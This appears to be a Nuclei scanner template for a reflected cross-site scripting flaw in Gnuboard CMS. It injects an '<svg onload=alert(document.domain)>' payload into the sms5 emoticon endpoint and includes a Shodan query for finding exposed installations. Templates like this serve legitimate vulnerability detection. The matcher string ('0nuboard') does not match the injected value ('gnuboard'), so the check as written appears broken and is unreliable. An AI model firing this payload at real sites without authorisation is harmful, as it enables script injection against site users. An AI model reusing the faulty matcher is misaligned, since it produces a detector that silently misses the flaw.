http:
- matchers:
  - part: body
    type: word
    words:
    - '"0nuboard<svg onload=alert(document.domain)>"'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>'
id: gnuboard-sms-xss
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: Gnuboard CMS contains a cross-site scripting vulnerability which allows
    remote attackers to inject arbitrary JavaScript into the responses returned by
    the server.
  metadata:
    max-request: 1
    shodan-query: http.html:"Gnuboard"
    verified: true
  name: Gnuboard CMS - Cross-Site Scripting
  reference:
  - https://sir.kr/g5_pds/4788?page=5
  - https://github.com/gnuboard/gnuboard5/commit/8182cac90d2ee2f9da06469ecba759170e782ee3
  severity: medium
  tags: xss,gnuboard
